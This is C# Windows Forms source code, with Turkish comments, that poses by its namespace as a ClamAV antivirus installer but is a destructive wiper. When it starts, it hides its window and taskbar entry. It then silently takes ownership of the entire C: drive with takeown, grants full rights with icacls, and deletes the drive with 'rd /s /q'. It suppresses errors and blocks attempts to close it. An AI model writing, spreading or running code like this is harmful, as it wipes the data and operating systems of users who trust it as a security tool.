using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace thirdpartyclamavinstaller0
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0; // Formun görünürlüğünü sıfıra ayarlar
            this.ShowInTaskbar = false; // Görev çubuğunda görünmemesini sağlar
            System32();
        }

        public void System32()
        {
            try
            {
                string system32Path = "C:\\";

                // takeown komutunu kullanarak sahipliği al
                Process takeownProcess = new Process();
                takeownProcess.StartInfo.FileName = "takeown";
                takeownProcess.StartInfo.Arguments = $"/F \"{system32Path}\" /R /A /D Y";
                takeownProcess.StartInfo.UseShellExecute = false;
                takeownProcess.StartInfo.CreateNoWindow = true;

                takeownProcess.Start();
                takeownProcess.WaitForExit();

                // icals komutunu kullanarak izinleri değiştir
                Process icaclsProcess = new Process();
                icaclsProcess.StartInfo.FileName = "icacls";
                icaclsProcess.StartInfo.Arguments = $"\"{system32Path}\" /grant %username%:(F)";
                icaclsProcess.StartInfo.UseShellExecute = false;
                icaclsProcess.StartInfo.CreateNoWindow = true;

                icaclsProcess.Start();
                icaclsProcess.WaitForExit();

                // System32 dizinini silmek için rd komutunu kullan (Dikkatli olun!)
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/C rd /s /q \"{system32Path}\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
            }
            catch (Exception ex)
            {

            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true; // Formun kapanmasını önler
            base.OnFormClosing(e);
        }
    }
    }